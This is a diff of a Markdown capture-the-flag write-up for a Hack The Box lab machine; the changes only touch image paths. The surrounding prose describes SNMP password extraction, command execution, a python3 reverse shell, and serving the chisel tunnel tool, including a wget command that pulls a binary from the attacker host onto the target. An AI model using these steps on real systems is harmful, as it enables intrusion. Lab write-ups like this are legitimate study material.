@@ -74,7 +74,7 @@ This nmap scan came back with pretty much the same information. I then viewed th
 
 I had actually had found the password for telnet on my own, but I was unable to decode it:
 
-![](<../../.gitbook/assets/image (333) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (333) (1) (1) (1) (1) (1).png>)
 
 I use **snmpget**, while the walk-through used **snmpwalk**. In the walk-through they used **binascii** (python import) in order to decode the bytes. I wanted to find a solution that was a bit more basic. I ended up using [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) to convert the bytes from hex to ascii:
 
@@ -90,7 +90,7 @@ I then noticed the walk-through mentioned to run `exec id`. I then tried playing
 
 I noticed the write-up use python for the reverse shell. I then used [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to see if I can use one of their python commands. Once I changed their python command from **python** to **python3**, it worked:
 
-![](<../../.gitbook/assets/image (349) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (349) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -100,7 +100,7 @@ I viewed the walk-through again to see what I missed. The walk-through author ru
 
 They then go on to say that we should use **chisel** to connect to the port. I ran into an issue here where I was unable to download a GitHub repository onto the machine itself. I then realize that you make the binary locally and then upload it to the server. I uploaded the file to the machine by running `python3 -m http.server` on the folder where chisel was downloaded. I was then able to upload it by running `wget http://10.10.14.10:8000/chisel` on the remote machine. When I uploaded the file, I was unable to run it due to some dependency error in terms of version of libc:
 
-![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 &#x20;I then followed [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/) to see what I missed and what I could have done instead. They run `wget localhost:631`, which makes a file called **index.html** in the folder you are in. There, you can see that CUPS is mentioned:
 
